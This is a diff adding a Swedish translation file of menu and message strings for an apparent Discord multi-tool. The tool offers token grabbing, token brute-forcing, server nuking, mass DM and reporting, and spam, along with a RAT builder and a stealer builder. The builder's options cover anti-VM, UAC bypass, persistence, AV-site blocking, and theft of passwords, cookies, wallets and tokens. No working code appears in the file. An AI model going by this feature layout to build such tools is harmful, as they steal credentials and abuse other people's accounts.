@@ -1,0 +1,396 @@
+Token Information{end_space8}
+Token Inloggning{end_space10}
+Token Nuker{end_space14}
+Token Grabber{end_space12}
+Token Avaktiverare{end_space7}
+Token Brute-Force{end_space8}
+Falsk Skrivare{end_space11}
+Ytlighetsskytt{end_space11}
+Gruppchattsspam{end_space10}
+Vänner Blockerare{end_space8}
+Vänner Borttagare{end_space13}
+Vänförfrågningsborttagare
+Skapa Nya Servrar{end_space8}
+Profiländrare{end_space12}
+QR-kodshämtare{end_space11}
+Discord Rått Bot{end_space9}
+Knapptryckare{end_space12}
+Meddelandereaktor{end_space8}
+Mass DM{end_space18}
+Massanmälan{end_space14}
+Massvän{end_space18}
+DM Borttagare{end_space12}
+DM Rensare{end_space15}
+Passera Regler{end_space11}
+Passera RestoreCord{end_space6}
+Passera Slägghammare{end_space5}
+WebHook Verktyg{end_space10}
+Skapad av Plingenn{end_space7}
+Ändringslogg{end_space13}
+Inställningar{end_space12}
+Chatt
+Hantera Tokens
+Nästa Sida{end_space1}
+Körs på:{end_space17}
+Ogiltigt val, försök igen!
+Avbruten av användaren.
+Temabytare
+Kontoinställningar
+Proxyinställningar
+Utseendeinställningar
+Växla felsökningsläge
+Adminpanel
+Ogiltig inställning
+CYAN
+BLÅ
+GRÖN
+RÖD
+VIT
+GUL
+MAGENTA
+LJUSRÖD
+LJUSBLÅ
+LJUSGRÖN
+LJUSCYAN
+LJUS SVART
+Tema satt till
+Kontoinformation
+Min licens
+Inköpshistorik
+Lösa in kod
+Ladda ner programvara
+Användarnamn
+Skapades den
+Ändra användarnamn
+Logga ut
+Användarnamnsändringen misslyckades. Användarnamnet måste innehålla minst 3 tecken.
+Vill du logga ut från ditt konto? (Y/N)
+Produkt
+Utgångsdatum
+Datum
+Skriv in din produktkod för att få ditt innehåll.
+Kod
+Du har redan löst in koden.
+Se till att spara din produkt innan du trycker på Enter!
+Nyckeln hittades inte i svaret
+Misslyckades med att hämta data för den angivna koden
+URL hittades inte i kodinformationen
+Ogiltig kod!
+Aktivera/använd proxy
+Rensa proxy-cache
+Lägg till egna proxys i cache
+Skrapa proxy
+Ogiltigt val
+Felsökningsläge {RED}Avaktiverat
+Felsökningsläge {GREEN}Aktiverat
+Lade till ny autentiseringssystem
+Förbättrade konfigurationssystemet
+Omarbetade panelgränssnittet
+Lade till chattsystem
+Lade till nya kontoinställningar
+Implementerade cache för bättre prestanda
+Anpassad Discord RPC
+Aktivera/Inaktivera Discord RPC
+Aktivera/Inaktivera Anpassad Discord RPC
+Redigera Anpassad Discord RPC
+Anpassad Discord RPC avaktiverad
+Anpassad Discord RPC aktiverad
+Detaljer (Obligatoriskt)
+Detaljer måste vara minst 3 tecken långa.
+Status (Obligatoriskt)
+Status måste vara minst 3 tecken lång.
+Stor bild-URL (Valfritt)
+Stor text (Valfritt)
+Liten bild-URL (Valfritt)
+Liten text (Valfritt)
+Hur många knappar vill du ha?
+Skriv etikett för knapp
+Skriv URL för knapp
+Ogiltigt URL-format. Ange en giltig URL.
+Ogiltigt antal knappar. Ange ett nummer mellan 0 och 2.
+Discord RPC avaktiverad
+Discord RPC aktiverad
+Normalt läge
+RestoreCord-läge (passera captcha)
+Cache-kontroll
+Anpassad kontroll
+Serverkontroll
+Ange den anpassade sökvägen för att ladda tokens från
+Normal chatt
+Supportchatt (Ej tillgänglig)
+Privatchatt (Ej tillgänglig)
+Server Sökning{end_space11}
+Server Kloner{end_space12}
+Server Nuker{end_space13}
+Token Anslutare{end_space10}
+Token Lämnare{end_space12}
+Token Spammare{end_space11}
+Seizure{end_space18}
+Ljudbräda Spammare{end_space7}
+Röstchatt Anslutare{end_space6}
+Profilbild Ändrare{end_space11}
+Global Nick Ändrare{end_space6}
+Server Nick Ändrare{end_space9}
+HypeSquad Ändrare{end_space8}
+Pronomen Ändrare{end_space9}
+Språk Ändrare{end_space12}
+Status Ändrare{end_space11}
+Tema Ändrare{end_space13}
+Bio Ändrare{end_space14}
+Konto Generator{end_space10}
+VideoCrash Skapare{end_space7}
+Inställningar Cyklist{end_space8}
+Versionsanteckningar{end_space5}
+Telegram{end_space17}
+Självbot{end_space17}
+Github{end_space19}
+Om{end_space23}
+Avsluta{end_space18}
+Föregående sida
+Servernamn
+Meddelande
+Trådantal
+Ett fel uppstod:
+Inga tokens hittades i cache
+Implementerar Rain Nuke
+Rain Nuke implementerad. . .
+Meddelar
+Meddelande-ID:
+Skickade ett meddelande till alla tillgängliga vänner.
+Lämnade server:
+Raderad server:
+Följande fel har påträffats och ignoreras:
+Raderade/Lämnade alla tillgängliga servrar.
+Tar bort vän:
+Tog bort vän:
+Tog bort alla tillgängliga vänner.
+Skapar
+Skapad
+Skapade alla servrar.
+Rain Nuke framgångsrikt detoneras!
+Har framgångsrikt förvandlats till en Reme Ödemark
+Ange något för att fortsätta. . .
+Startar seizure-läge (Växlar mellan Ljus/mörkt läge)
+Inte tillräckligt med vänner för att fortsätta.
+Ett fel uppstod vid bearbetning av token
+Kanal-Spammare
+Kanal-ID
+Regel Förbigång
+Server-ID
+Token Falsk Skrivare
+Global Nickare
+Användarnamn
+Server Nickare
+Pronomen Ändrare
+Slumpmässiga Pronomen (y/n)
+Pronomen
+Raderade DM:
+Inte tillräckligt med DM för att fortsätta.
+Cykel avbruten
+Ljudbrädespam
+Programmet avbröts av användaren.
+Misslyckades med att skicka hjärtslag med token:
+Misslyckades med att ansluta till röstchatt med token:
+Ansluter till röstchatt med tokens..
+Uppdaterade inbjudan framgångsrikt, din server kan nu nås av
+Misslyckades med att uppdatera skön URL. Statuskod:
+Skönkod att snipa
+Server-ID att tillämpa skön på
+Fördröjning mellan kontroller (sekunder)
+Skönskytt har startat. Tryck Ctrl+C för att stoppa.
+Fel:
+Webhook-Spammare
+Webhook-Raderare
+Webhook
+Webhook raderades framgångsrikt
+Tokenhanterare
+Spara tokens
+Rensa tokens
+Kontrollera tokens och spara endast giltiga (y/n)
+Token-cache tömd.
+Ange sökvägen till textfilen som innehåller tokens
+Inga tokens hittades i den angivna textfilen
+Token kontroll
+Misslyckades med att hämta servernamn:
+Ansluter
+Rain token brute-force. PS: Detta kan ta lång tid att utföra.
+Om du är extremt lycklig och lyckas få tag i någons token, kommer du att hitta den sparad i 'brute-force.txt'.
+Sök alltid explicit tillstånd från personen innan du utför en brute force-attack på deras konto.
+Ogiltigt användar-id, försök igen!
+GILTIG
+OGILTIG
+Fel vid hämtning av betalningskällor:
+Fel vid hämtning av nitro-data:
+Ingen betalningsinformation tillgänglig.
+Samlar användarinformation & Webdrivrutiner..
+Filnamn
+Fil lösenord
+Vill du ange en ikonfil? (Y/N)
+Ogiltig ikon sökväg eller URL. Ställer in ikon till Ingen.
+Pinga mig (J/N)
+Anti VM (J/N)
+Starta vid uppstart (J/N)
+UAC-bypass (J/N)
+Smälta (J/N)
+Dölj konsolen (J/N)
+Fånga webbkamera (J/N)
+Fånga lösenord (J/N)
+Fånga kakor (J/N)
+Fånga autofyllningar (J/N)
+Fånga historik (J/N)
+Fånga Discord-tokens (J/N)
+Fånga spel (J/N)
+Fånga Wi-Fi-lösenord (J/N)
+Fånga systeminformation (J/N)
+Fånga skärmbild (J/N)
+Fånga Telegram (J/N)
+Fånga vanliga filer (J/N)
+Fånga plånböcker (J/N)
+Fejkfel (J/N)
+Fejkfelrubrik
+Fejkfelmeddelande
+Blockera AV-webbplatser (J/N)
+Discordinjektion (J/N)
+Filikon
+Skapar {name}.exe, Det här kommer att ta några sekunder. Tack för ditt tålamod!
+Fil finns i 'output/grabberbuilder/{name}.exe
+Skapade gruppchatt
+Ratebegränsad ({response.json()['retry_after']}ms)
+Inte tillräckligt med vänner tillgängliga för slumpmässigt urval
+Vill du välja användare själv för gruppchatt-spam eller vill du välja slumpmässigt?
+Välj användare själv
+Slumpmässig urval av användare
+Skapar gruppchattar
+Användar-id
+Du hade inte några kommatecken (,) formatet är id,id2,id3
+när som helst för att avbryta
+Blockerad:
+Fel vid hämtning av relationer:
+Inte tillräckligt med vänförfrågningar för att fortsätta.
+Inkommande vänförfrågan från:
+Borttagen vänförfrågan från:
+Totalt antal borttagna vänförfrågningar:
+Ett fel uppstod vid skapandet av {server_name}: {e}
+Ikon för serverarna yes/no
+Slumpmässiga servernamn
+Anpassade servernamn
+Namn på serverna som kommer att skapas
+Ange platsen för ikonen
+Kunde inte hitta "{image}" på din dator
+Anpassad status
+Anpassad biografi
+Skapar fil... {i}
+Skriver fil... {i}
+Notera: Den här koden fungerar inte helt korrekt just nu, men den är fortfarande körbar.\nDu kan dock stöta på fel eller buggar.
+Ange namnet du vill ge till den slutliga filen
+Ange token för botten du kommer att använda för att utföra RAT-kommandon
+Bot-token
+Ange guild-ID:t där slash-kommandona är registrerade
+Fel vid skrivning av fil: {e}
+Fil har skrivits korrekt till "output/{fileName}.py"
+Konvertera din skript till en körbar fil (Y/N)
+Skapar fil...
+Rensar gamla filer...
+Den körbara filen har genererats korrekt
+Ett HTTP-fel inträffade: {e}
+Meddelande-ID
+Välj knappen du vill trycka på
+{r}({LIGHTBLACK_EX}{i}{r}) Namn: {LIGHTBLACK_EX}{button_label}{r} , Anpassad ID: {LIGHTBLACK_EX}{button_custom_id}
+Knapp
+Endast en knapp hittades i meddelandet.
+Misslyckades med att lägga till reaktion {reaction} till meddelande {message_id}. Maximalt antal reaktioner har redan nåtts.
+Maximalt antal reaktioner har redan nåtts.
+Misslyckades med att lägga till reaktion {reaction} till meddelande {message_id}. Förbjudet: {error_message}
+Objekt
+Ansigten
+Djur
+Symboler
+Inga emojis hittades i svaret
+Misslyckades med att hämta emojis från API:et
+Inbjudningslänk
+Ogiltigt inbjudningslänkformat.
+Ett fel uppstod vid sändning av begäran
+Inbjudningsinformation:
+Inbjudarinformation:
+Serverinformation:
+Kanal
+Utgångsdatum
+Användar-ID
+Märken
+Otillgänglig
+Namn
+Server-ID
+Beskrivning
+Banner
+Banner-URL
+Banner-URL (Otillgänglig)
+Skön URL
+Verifieringsnivå
+Splash
+Splash-URL
+Splash-URL (Otillgänglig)
+Funktioner
+Seizure startad. Tryck på Ctrl+C för att stoppa.
+Seizure avbruten
+Språkcykling har startat. Tryck på Ctrl+C för att stoppa.
+Ogiltig Token.
+Tryck på ENTER för att fortsätta
+Discord API-verktyg | https://Rain.xyz | Skapad av Plingenn
+Utseendeinställningar
+Textinställningar
+Cursorinställningar
+Transparensinställningar
+Fönsterinställningar
+Språkinställningar
+Färgschema
+Teckensnitt
+Teckenstorlek
+Radhöjd
+Teckenfetstil
+Retro Terminal Effekter
+Färginställningar
+Teckeninställningar
+Teckenstorleksinställningar
+Radhöjdsinställningar
+Teckenfetstilsinställningar
+Retroinställningar
+Cursorinställningar
+Språk satt till {chosen_language}
+Onamnad
+Typ
+Hus
+Meddelandelänk
+Ogiltig meddelandelänk
+Går tillbaka...
+Misslyckades med att ansluta till Discord RPC: {e}
+Val
+Tema
+Inställning
+Redigera
+Språk
+Panelopacitet
+Ogiltig opacitet
+Fönsterinställningar
+Denna alternativ är under utveckling
+Detta alternativ är för närvarande inte tillgängligt. Var snäll och ha tålamod eftersom det kommer att läggas till senare.
+Detta alternativ är för närvarande inte tillgängligt.
+Det kommer att ersättas i en av de kommande uppdateringarna med: '{replacement}'.
+Denna alternativ är inte tillgängligt
+Dessa alternativ är för närvarande under utveckling
+Dessa alternativ är för närvarande under utveckling men är användbara. Det är dock troligt att buggar eller fel kan förekomma.
+Det gick inte att hämta pronomen från {pronounce_url} ({statuscode})
+Proxyanvändning är för närvarande inte tillgänglig. Vi ber om ursäkt för eventuella besvär. Den kommer att göras tillgänglig i en av våra kommande uppdateringar.
+Proxyanvändning {RED}Avaktiverat
+Proxyanvändning {GREEN}Aktiverat
+Lyckades skriva nya proxys
+Lyckades skrapa proxys
+Klart! Skrapade {proxies} totalt => {temp} | {execution_time}ms
+PC{end_space6}
+Implementerat flerspråkigt stöd.
+Mass Tråd{end_space16}
+Forum Spammare
+Massanvändar DM{end_space10}
+Ej tillämpligt{end_space11}
+Serverboostare{end_space16}
+Token Onliner{end_space12}
+Omröstningsskapare{end_space7}
